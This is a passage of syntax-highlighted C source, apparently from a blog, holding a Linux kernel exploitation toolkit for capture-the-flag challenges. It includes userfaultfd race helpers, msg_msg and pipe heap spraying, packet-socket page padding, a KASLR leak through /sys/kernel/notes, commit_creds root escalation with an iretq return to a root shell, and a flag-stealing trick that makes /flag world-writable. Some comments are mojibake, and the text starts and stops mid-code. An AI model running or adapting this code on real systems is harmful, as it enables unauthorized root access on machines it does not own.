len,</span></span><br><span class="line"><span class="params">                          <span class="type">void</span> *(*handler)(<span class="type">void</span> *))</span> &#123;</span><br><span class="line">  <span class="type">long</span> uffd;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">  <span class="type">int</span> s;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">  <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">  uffdio_api.api = UFFD_API;</span><br><span class="line">  uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">  uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>)addr;</span><br><span class="line">  uffdio_register.range.len = len;</span><br><span class="line">  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">  <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">  s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="type">void</span> *)uffd);</span><br><span class="line">  <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123; commit_creds(init_cred); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!getuid()) &#123;</span><br><span class="line">    success(<span class="string">&quot;[=============================================]\n&quot;</span>);</span><br><span class="line">    success(<span class="string">&quot;[===================&quot;</span> GREEN <span class="string">&quot;SUCCESS&quot;</span> END</span><br><span class="line">            <span class="string">&quot;===================]\n&quot;</span>);</span><br><span class="line">    success(<span class="string">&quot;[=============================================]\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;*** root failed ***&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// data for copy</span></span><br><span class="line"><span class="type">uint64_t</span> page[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">  <span class="type">static</span> <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">  <span class="type">long</span> uffd;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">  <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">  uffd = (<span class="type">long</span>)arg;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="type">int</span> nready;</span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * å½“ poll è¿”å›æ—¶è¯´æ˜å‡ºç°äº†ç¼ºé¡µå¼‚å¸¸</span></span><br><span class="line"><span class="comment">     * ä½ å¯ä»¥åœ¨è¿™é‡Œæ’å…¥ä¸€äº›æ¯”å¦‚è¯´ sleep() ä¸€ç±»çš„æ“ä½œ</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    success(<span class="string">&quot;enter the fault handler\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fd_tty = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">      err_exit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">      err_exit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">      err_exit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">      err_exit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>)page;</span><br><span class="line">    uffdio_copy.dst =</span><br><span class="line">        (<span class="type">unsigned</span> <span class="type">long</span>)msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">    uffdio_copy.len = page_size;</span><br><span class="line">    uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">    uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">      err_exit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ETH_P_ALL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ETH_P_ALL 0x0003</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_socket_rx_ring_init</span><span class="params">(<span class="type">int</span> s, <span class="type">unsigned</span> <span class="type">int</span> block_size,</span></span><br><span class="line"><span class="params">                                <span class="type">unsigned</span> <span class="type">int</span> frame_size, <span class="type">unsigned</span> <span class="type">int</span> block_nr,</span></span><br><span class="line"><span class="params">                                <span class="type">unsigned</span> <span class="type">int</span> sizeof_priv,</span></span><br><span class="line"><span class="params">                                <span class="type">unsigned</span> <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">  <span class="type">int</span> v = TPACKET_V3;</span><br><span class="line">  <span class="type">int</span> rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &amp;v, <span class="keyword">sizeof</span>(v));</span><br><span class="line">  <span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;setsockopt(PACKET_VERSION)&quot;</span>), <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">req</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">  req.tp_block_size = block_size;</span><br><span class="line">  req.tp_frame_size = frame_size;</span><br><span class="line">  req.tp_block_nr = block_nr;</span><br><span class="line">  req.tp_frame_nr = (block_size * block_nr) / frame_size;</span><br><span class="line">  req.tp_retire_blk_tov = timeout;</span><br><span class="line">  req.tp_sizeof_priv = sizeof_priv;</span><br><span class="line">  req.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">  <span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;setsockopt(PACKET_RX_RING)&quot;</span>), <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">packet_socket_setup</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> block_size, <span class="type">unsigned</span> <span class="type">int</span> frame_size,</span></span><br><span class="line"><span class="params">                        <span class="type">unsigned</span> <span class="type">int</span> block_nr, <span class="type">unsigned</span> <span class="type">int</span> sizeof_priv,</span></span><br><span class="line"><span class="params">                        <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">  <span class="type">int</span> s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line">  <span class="keyword">if</span> (s &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;socket(AF_PACKET)&quot;</span>), <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  packet_socket_rx_ring_init(s, block_size, frame_size, block_nr, sizeof_priv,</span><br><span class="line">                             timeout);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_ll</span> <span class="title">sa</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">  sa.sll_family = PF_PACKET;</span><br><span class="line">  sa.sll_protocol = htons(ETH_P_ALL);</span><br><span class="line">  sa.sll_ifindex = if_nametoindex(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">  sa.sll_hatype = <span class="number">0</span>;</span><br><span class="line">  sa.sll_pkttype = <span class="number">0</span>;</span><br><span class="line">  sa.sll_halen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> rv = bind(s, (<span class="keyword">struct</span> sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">  <span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;bind(AF_PACKET)&quot;</span>), <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pagealloc_pad</span><span class="params">(<span class="type">int</span> count, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> packet_socket_setup(size, <span class="number">2048</span>, count, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hexdump</span><span class="params">(<span class="type">uint64_t</span> *payload, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d:\t%#lx\n&quot;</span>, i, payload[i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">  <span class="type">uint64_t</span> next;</span><br><span class="line">  <span class="type">uint64_t</span> prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">  <span class="type">uint64_t</span> m_type;</span><br><span class="line">  <span class="type">uint64_t</span> m_ts;</span><br><span class="line">  <span class="type">uint64_t</span> next;</span><br><span class="line">  <span class="type">uint64_t</span> security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">  <span class="type">uint64_t</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">struct msgbuf &#123;</span></span><br><span class="line"><span class="comment">    long mtype;</span></span><br><span class="line"><span class="comment">    char mtext[0];</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_msg_queue</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * the msgp should be a pointer to the `struct msgbuf`,</span></span><br><span class="line"><span class="comment"> * and the data should be stored in msgbuf.mtext</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">write_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span> &#123;</span><br><span class="line">  ((<span class="keyword">struct</span> msgbuf *)msgp)-&gt;mtype = msgtyp;</span><br><span class="line">  <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">peek_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp,</span><br><span class="line">                MSG_COPY | IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">build_msg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg, <span class="type">uint64_t</span> m_list_next, <span class="type">uint64_t</span> m_list_prev,</span></span><br><span class="line"><span class="params">               <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts, <span class="type">uint64_t</span> next,</span></span><br><span class="line"><span class="params">               <span class="type">uint64_t</span> security)</span> &#123;</span><br><span class="line">  msg-&gt;m_list.next = m_list_next;</span><br><span class="line">  msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">  msg-&gt;m_type = m_type;</span><br><span class="line">  msg-&gt;m_ts = m_ts;</span><br><span class="line">  msg-&gt;next = next;</span><br><span class="line">  msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_stat</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;movq %%cs, %0;&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %%ss, %1;&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %%rsp, %2;&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;pushfq;&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;popq %3;&quot;</span></span></span><br><span class="line"><span class="params">               : <span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_sp), <span class="string">&quot;=r&quot;</span>(user_rflags)</span></span><br><span class="line"><span class="params">               :</span></span><br><span class="line"><span class="params">               : <span class="string">&quot;memory&quot;</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">templine</span><span class="params">()</span> &#123;</span><br><span class="line">  commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">  <span class="keyword">asm</span>(<span class="string">&quot;pushq   %0;&quot;</span></span><br><span class="line">      <span class="string">&quot;pushq   %1;&quot;</span></span><br><span class="line">      <span class="string">&quot;pushq   %2;&quot;</span></span><br><span class="line">      <span class="string">&quot;pushq   %3;&quot;</span></span><br><span class="line">      <span class="string">&quot;pushq   $shell;&quot;</span></span><br><span class="line">      <span class="string">&quot;pushq   $0;&quot;</span></span><br><span class="line">      <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">      <span class="string">&quot;popq    %%rbp;&quot;</span></span><br><span class="line">      <span class="string">&quot;iretq;&quot;</span> ::<span class="string">&quot;m&quot;</span>(user_ss),</span><br><span class="line">      <span class="string">&quot;m&quot;</span>(user_sp), <span class="string">&quot;m&quot;</span>(user_rflags), <span class="string">&quot;m&quot;</span>(user_cs));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_cpu</span><span class="params">(<span class="type">int</span> core)</span> &#123;</span><br><span class="line">  <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">  CPU_ZERO(&amp;cpu_set);</span><br><span class="line">  CPU_SET(core, &amp;cpu_set);</span><br><span class="line">  sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unshare_setup</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="type">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">  <span class="type">int</span> tmp_fd;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET))</span><br><span class="line">    err_exit(<span class="string">&quot;FAILED to create a new namespace&quot;</span>);</span><br><span class="line"></span><br><span class="line">  tmp_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">  write(tmp_fd, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">  close(tmp_fd);</span><br><span class="line"></span><br><span class="line">  tmp_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">  <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getuid());</span><br><span class="line">  write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">  close(tmp_fd);</span><br><span class="line"></span><br><span class="line">  tmp_fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">  <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getgid());</span><br><span class="line">  write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">  close(tmp_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __always_inline <span class="title function_">pt_reg</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buffer)</span> &#123;</span><br><span class="line">  __asm__ __volatile__(<span class="string">&quot;movq $0xbeefdead,   %%r15;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $0x11111111,   %%r14;&quot;</span> <span class="comment">// 0x78</span></span><br><span class="line">                       <span class="string">&quot;movq $0x22222222,   %%r13;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $0x33333333,   %%r12;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $0x66666666,   %%r11;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $0x77777777,   %%r10;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $0x88888888,    %%r9;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $0x99999999,    %%r8;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $0xaaaaaaaa,   %%rcx;&quot;</span></span><br><span class="line">                       <span class="string">&quot;xorq %%rdi,   %%rdi;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movl %0,   %%edi;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq %1,   %%rsi;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $0x20,   %%rdx;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $1,   %%rax;&quot;</span></span><br><span class="line">                       <span class="string">&quot;syscall;&quot;</span> ::<span class="string">&quot;r&quot;</span>(fd),</span><br><span class="line">                       <span class="string">&quot;r&quot;</span>(buffer));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * read /sys/kernel/notes for passing kaslr</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">leak_from_notes</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd_leak = open(<span class="string">&quot;/sys/kernel/notes&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="type">char</span> leak[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  read(fd_leak, leak, <span class="number">0x100</span>);</span><br><span class="line">  <span class="type">uint64_t</span> base = *(<span class="type">uint64_t</span> *)(&amp;leak[<span class="number">0x9c</span>]) - <span class="number">0x2000</span>;</span><br><span class="line">  success(<span class="string">&quot;leaking address: %#lx&quot;</span>, base);</span><br><span class="line">  <span class="keyword">return</span> base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_flag</span><span class="params">()</span> &#123;</span><br><span class="line">  system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/chmod 777 /flag&#x27; &gt; /tmp/x&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;chmod +x /tmp/x&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;/tmp/dummy&quot;</span>);</span><br><span class="line">  usleep(<span class="number">3000</span>);</span><br><span class="line">  system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  pause();</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_flag2</span><span class="params">()</span> &#123;</span><br><span class="line">  execve(<span class="string">&quot;/tmp/dummy&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="type">int</span> fd_flag = open(<span class="string">&quot;/flag&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x50</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  read(fd_flag, buf, <span class="number">0x50</span>);</span><br><span class="line">  write(<span class="number">1</span>, buf, <span class="number">0x50</span>);</span><br><span class="line">  pause();</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">free_pipe</span><span class="params">(<span class="type">int</span> flides[<span class="number">2</span>])</span> &#123;</span><br><span class="line">  close(flides[<span class="number">0</span>]);</span><br><span class="line">  close(flides[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __attribute__((constructor)) init() &#123;</span><br><span class="line">  bind_cpu(<span class="number">0</span>);</span><br><span class="line">  page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arandom_params</span> // <span class="title">sizeof</span>=</span><span class="number">0xC</span></span><br><span class="line">&#123;                     <span class="comment">// XREF: random_info/r</span></span><br><span class="line">  <span class="type">uint32_t</span> rand_size; <span class="comment">// XREF: arandom_ioctl+BF/r</span></span><br><span class="line">  <span class="type">uint32_t</span> rand_offset;</span><br><span class="line">  <span class="type">uint32_t</span> rand_value;</span><br><span class="line">&#125; AAA;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">adjust_rlimit</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim</span>;</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  rlim.rlim_cur = rlim.rlim_max = (200 &lt;&lt; 20);</span></span><br><span class="line"><span class="comment">  setrlimit(RLIMIT_AS, &amp;rlim);</span></span><br><span class="line"><span class="comment">  rlim.rlim_cur = rlim.rlim_max = 32 &lt;&lt; 20;</span></span><br><span class="line"><span class="comment">  setrlimit(RLIMIT_MEMLOCK, &amp;rlim);</span></span><br><span class="line"><span class="comment">  rlim.rlim_cur = rlim.rlim_max = 136 &lt;&lt; 20;</span></span><br><span class="line"><span class="comment">  // setrlimit(RLIMIT_FSIZE, &amp;rlim);</span></span><br><span class="line"><span class="comment">  rlim.rlim_cur = rlim.rlim_max = 1 &lt;&lt; 20;</span></span><br><span class="line"><span class="comment">  setrlimit(RLIMIT_STACK, &amp;rlim);</span></span><br><span class="line"><span class="comment">  rlim.rlim_cur = rlim.rlim_max = 0;</span></span><br><span class="line"><span class="comment">  setrlimit(RLIMIT_CORE, &amp;rlim);</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="comment">// RLIMIT_FILE</span></span><br><span class="line">  rlim.rlim_cur = rlim.rlim_max = <span class="number">14096</span>;</span><br><span class="line">  <span class="keyword">if</span> (setrlimit(RLIMIT_NOFILE, &amp;rlim) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">4096</span>;</span><br><span class="line">    <span class="keyword">if</span> (setrlimit(RLIMIT_NOFILE, &amp;rlim) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;setrlimit&quot;</span>);</span><br><span class="line">      err_exit(<span class="string">&quot;setrlimit&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pre_spray</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRE_MSG_NUM 56</span></span><br><span class="line">  <span class="type">int</span> pre_ms_qid[PRE_MSG_NUM];</span><br><span class="line">  <span class="type">char</span> *pre_msg_buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">  <span class="type">char</span> *pre_msg_recv = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PRE_MSG_NUM; ++i) &#123;</span><br><span class="line">    pre_ms_qid[i] = get_msg_queue();</span><br><span class="line">    <span class="built_in">memset</span>(pre_msg_buf, (<span class="type">char</span>)i, <span class="number">0x1000</span>);</span><br><span class="line">    check(write_msg(pre_ms_qid[i], pre_msg_buf, <span class="number">0x1000</span> - <span class="number">0x30</span>, <span class="number">1</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  success(<span class="string">&quot;pre spray msg_msg successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PRE_MSG_NUM - <span class="number">8</span>; i += <span class="number">8</span>) &#123;</span><br><span class="line">    check(read_msg(pre_ms_qid[i], pre_msg_recv, <span class="number">0x1000</span> - <span class="number">0x30</span>, <span class="number">1</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  info(<span class="string">&quot;free some objs\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = PRE_MSG_NUM - <span class="number">7</span>; i &lt; PRE_MSG_NUM; ++i) &#123;</span><br><span class="line">    check(read_msg(pre_ms_qid[i], pre_msg_recv, <span class="number">0x1000</span> - <span class="number">0x30</span>, <span class="number">1</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  info(<span class="string">&quot;free before 8 objs\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_pipe</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> pipe_num = <span 